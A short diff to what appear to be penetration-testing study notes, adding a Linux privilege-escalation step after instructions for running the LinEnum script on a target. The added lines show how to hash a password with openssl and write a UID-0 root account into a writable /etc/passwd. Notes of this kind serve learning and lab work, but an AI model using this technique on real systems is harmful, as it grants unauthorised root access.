@@ -313,3 +313,8 @@ choice.
  - copy the raw LinEnum code from your local machine [1] and paste it into a new file on the target, using Vi or Nano [2].
  - Once you've done this, you can save the file with the ".sh" extension. 
  - Then make the file executable using the command "chmod +x FILENAME.sh".
+ 
+ ### Editing writable /etc/passwd
+ - create hash  "openssl passwd -1 -salt [salt] [password]"
+ - in /etc/passwd add username:passwordhash:0:0:root:/root:/bin/bash
+
